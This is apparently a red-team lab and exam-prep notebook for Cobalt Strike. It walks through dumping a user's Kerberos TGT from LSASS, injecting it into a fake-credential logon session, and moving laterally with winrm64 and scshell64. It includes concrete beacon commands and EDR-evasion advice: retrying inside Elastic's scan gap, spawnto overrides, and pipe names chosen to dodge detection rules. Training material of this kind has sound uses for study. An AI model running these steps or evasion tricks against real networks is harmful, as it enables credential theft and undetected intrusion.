# User Impersonation Lab

> **Objective:** Dump a user's TGT from their active logon session and impersonate it to access remote resources as that user without knowing their password.

## When Impersonation  

>Have a SYSTEM beacon from Privilege Escalation  
>Then Dump TGT → impersonate user → access remote resources
>Lateral Movement  
>Domain Dominance  

## Prerequisite

⚠️ Load Kerbeus-BOF aggressor script if not already loaded:
```
CS → Cobalt Strike → Script Manager → Load → C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
```

## Verify access denied 

```cs
beacon> ls \\lon-ws-1\c$
```

## Local Enumeration    

From the SYSTEM beacon, look for processes running as the other user:

```cs
ps

// Look for any process where User = CONTOSO\rsteel
// e.g. cmd.exe, mmc.exe, explorer.exe owned by rsteel

krb_triage
```

Look for user: `rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM`  

| LUID | Account | Notes |
|------|---------|-------|
| `0x3e7` | `lon-wkstn-1$` | SYSTEM logon session — machine account TGT |
| `0x3e4` | `lon-wkstn-1$` | Network service logon session |
| Any other | Domain user | Interactive or network logon — user TGT |

## Dump User  

```cs
krb_dump /user:rsteel /service:krbtgt
```

**OPSEC:** `OPSEC-🟠CAUTION`
- Kerbeus-BOF reads from LSASS via Kerberos API — no raw `ReadProcessMemory` on LSASS
- Less detectable than Mimikatz `sekurlsa::tickets` but still touches LSASS indirectly
- Event 4769 (Kerberos service ticket request) may fire on the DC — not directly from this command
- Elastic EDR and Sysmon will log the BOF execution (via the beacon process)

Copy the base64 kirbi from the output.

## Save kirbi to attacker desktop

>Copy base64 value and paste to PowerShell command on attacker desktop PowerShell:

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("<paste-base64-here>"))
```

## Create sacrificial logon session  

```cs
beacon> make_token CONTOSO\rsteel FakePass
```

**OPSEC:** `OPSEC-🟠CAUTION`
- Creates a Type 9 (NewCredentials) logon session — **Event 4648 logged**
- The password is fake — it is never validated by the DC
- The logon session is local only — used as a container to hold the injected Kerberos ticket
- Event 4648 shows `CONTOSO\rsteel` logged on from this machine — visible to SIEM

**Why FakePass works:**
`make_token` with `/netonly` semantics creates a logon session without validating credentials
locally. The ticket you inject next provides the actual Kerberos authentication — the password
field is irrelevant for ticket-based auth.

## Inject TGT kirbi file in logon session  

```cs
kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
```

**OPSEC:** `OPSEC-🟠CAUTION`
- Calls `LsaCallAuthenticationPackage` with `KerbSubmitTicketMessage` — injects ticket into
  the logon session created by `make_token`
- Not directly signatured, but Elastic EDR hooks LSASS API calls — visible in telemetry

## Verify ticket is loaded

>Use `powerpick` instead to avoid the child process: OPSEC-🟠CAUTION 
```cs
powerpick klist
```
## Access remote resource

```cs
ls \\lon-ws-1\c$
ls \\lon-dc-1\c$
```

### Step 8 — Drop impersonation

```cs
beacon> rev2self
```

**Always run `rev2self` after completing the task** — leaves the logon session open but stops
using the stolen token. The logon session is purged when the beacon exits.

---

## OPSEC — steal_token vs make_token Comparison

| | `steal_token` | `make_token` + `kerberos_ticket_use` |
|--|---|---|
| Tier | 🟢SAFE | 🟠CAUTION |
| Logon event | None | Event 4648 on local host |
| LSASS touch | None | Kerberos API via LSASS |
| Requires | Target process running | TGT from `krb_dump` |
| Works after user logs off | No | Yes (while kirbi is valid) |
| Exam preference | **Always try first** | Fallback |

----

# Plaintext Passwords Not Required

Token/ticket impersonation bypasses the need to crack hashes entirely. Know Kerberoasting as a technique for exam scoring, but do not depend on cracking being in the critical path.

| Goal | Technique | Needs plaintext? |
|------|-----------|-----------------|
| Lateral movement | `steal_token` + `jump winrm64` | No |
| Lateral movement | `make_token` + `kerberos_ticket_use` + `jump winrm64` | No — fake pass works |
| NTLM-based lateral | `pth` | NTLM hash only — no plaintext |
| Domain recon | `ldapsearch` BOF | No |
| Access remote share | stolen TGT + `kerberos_ticket_use` | No |

**When plaintext is actually required:**
- RDP with password authentication (rare in exam)
- Credential spraying if no tickets available

**Exam path:** `steal_token` → `jump winrm64` → new beacon as impersonated user. Token/ticket impersonation is always faster and stealthier than waiting on hashcat.

---

## Lateral Movement — All Jump Methods (Post-Impersonation Exam Reference)

> Run these **after** `steal_token` or `make_token` + `kerberos_ticket_use`. Work top-to-bottom — stop at the first method that gives you a live beacon. Each method has a different detection profile; know when to fall down.

### Pre-flight — Always set spawnto before jumping

```cs
// For WinRM / inject-based jumps (fork & run into remote process)
beacon> spawnto x64 %windir%\sysnative\werfault.exe

// For service-based jumps (scshell64, psexec64)
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
```

> Default spawnto is `rundll32.exe` — signatured by every major EDR. Always override before any `jump` command.

---

### Jump to host

>Use winrm64 if enabled on target  

```cs
beacon> powerpick Test-WSMan lon-ws-1       // test reachability — OPSEC-🟢SAFE, no child proc
beacon> jump winrm64 lon-ws-1 smb
```

| Property | Detail |
|----------|--------|
| Mechanism | WinRM executes shellcode, injects into `wsmprovhost.exe` |
| Service created | No |
| Event 7045 | No |
| Event 4648 | No (if steal_token used) |
| Disk write | No |
| Child process on source | No |

**EDR caveat + retry behaviour (lab-confirmed 2026-04-19):**
`jump winrm64` generates the SMB beacon payload on-the-fly. Elastic Endpoint may kill it on first attempt (`ERROR_FILE_NOT_FOUND`). **Always retry once before falling down** — Elastic has a scan latency window and the second attempt often succeeds within 10–15 seconds of the first.

```
Attempt 1 → ERROR_FILE_NOT_FOUND  (Elastic killed beacon before pipe created)
Wait 10-15 seconds
Attempt 2 → established link      (payload executed inside EDR scan window gap)
```

Only fall to Method `scshell64` if two consecutive attempts both return `ERROR_FILE_NOT_FOUND`.

---

### Method scshell64  

**Use when WinRM is disabled or payload gets caught. Modifies an existing service — no new service created.**

```cs
// Load CNA first if not already loaded:
// CS → Script Manager → Load → C:\Tools\SCShell\CS-BOF\scshell.cna

beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> jump scshell64 <target> <listener>
beacon> rev2self
```

| Property | Detail |
|----------|--------|
| Mechanism | Modifies existing service `ImagePath` via SCM RPC — runs payload as SYSTEM |
| Service created | No (modifies existing) |
| Event 7045 | No |
| Event 7040 | **Yes** — service config changed |
| Disk write | No |
| Requires | Local admin on target |

> SCShell restores the original service path after execution — Event 7040 fires twice (change + restore). Less noisy than psexec but still visible to a tuned SIEM.

---


### Lab-Observed: Elastic Endpoint Behaviour (2026-04-19)

**All hosts confirmed running:** `elastic-agent.exe`, `elastic-endpoint.exe`, `MsMpEng.exe`, `Sysmon64.exe`

**winrm64 findings — Unconstrained Delegation lab:**
- Source beacon died after `jump winrm64` — Elastic had already tracked/flagged the beacon process in that lab instance
- Likely cause: beacon was already an active detection target before the jump — fresh lab instances behave differently
- Not a reliable indicator of winrm64 capability — environment state matters

**winrm64 findings — Constrained Delegation lab (fresh instance):**
- Attempt 1 with `smb` (TSVCPIPE-*) → `ERROR_FILE_NOT_FOUND` — Elastic kills beacon on lon-fs-1 before pipe created
- Attempt 2 (13s later) with `smb` → `[+] established link` — **succeeded** via scan latency gap
- `smb_custom` (mojo pipe) → `[+] established link` **first attempt** — may be pipe name effect, may be fresh Elastic state
- Conclusion: **retry winrm64 once before falling to scshell64** — timing/environment state is a factor

**scshell64 findings:**
- `ak-settings spawnto_x64 C:\Windows\System32\svchost.exe` required first
- Payload binary (`evil59.exe`) written to `\\target\C$\Windows\System32\` — transient, auto-deleted
- `defragsvc` service path modified (Event 7040 × 2) — restored after execution
- Beacon established **first attempt in both lab instances** — most reliable delivery method observed
- OPSEC cost: Event 7040 × 2, brief disk write to System32

**Auth method conclusion:** `steal_token` required for WinRM auth — uses real Kerberos TGT from the target process token. `make_token` without `kerberos_ticket_use` = `ERROR_LOGON_FAILURE` — WinRM rejects fake credentials. Never use `make_token` alone for WinRM lateral movement.

**Pipe name conclusion:** Pipe name is NOT the primary Elastic detection vector — payload content in memory is. However, custom pipe names are still required for exam OPSEC score (examiner reviews artifacts) and to avoid MDI/threat hunting detections on `TSVCPIPE-*`. See pipe name guidance below.

---

### SMB Listener Pipe Name — Exam Day

**Do NOT use `mojo.5688.8052.183894939787088877`** — this specific value has been documented in threat intelligence reports since 2019 (FalconForce, Red Canary, Elastic detection rules). It is as signatured as `TSVCPIPE-*` in modern detection tooling.

**Do NOT use any of these — all documented CS IOCs:**
```
TSVCPIPE-*       ← CS default
mojo.*           ← documented evasion technique since 2019
msagent_*        ← CS default
postex_*         ← CS default
MSSE-*-server    ← CS default
```

**Use on exam day — blends with legitimate Windows/application pipes:**

```
CS → Listeners → Add (SMB) → Pipename field:

Option 1 — matches post-ex profile pipename pattern (consistent across all CS pipes):
  dotnet-diagnostic-#####
  (CS replaces each # with a random digit — different every session)

Option 2 — GUID format (generic, common in Windows IPC):
  ########-####-####-####-############

Option 3 — Windows service pipe pattern:
  wkssvc-########
  ntsvcs-########
```

> `#` is a CS wildcard — replaced with a random hex digit when the listener is created. Use this format so your pipe name is unique each exam session and never matches a documented IOC list.

Your malleable profile already sets `post-ex.pipename "dotnet-diagnostic-#####, ########-####-####-####-############"` — use `dotnet-diagnostic-#####` for the SMB listener too, so all CS named pipes follow the same pattern and blend together as .NET runtime diagnostic pipes.
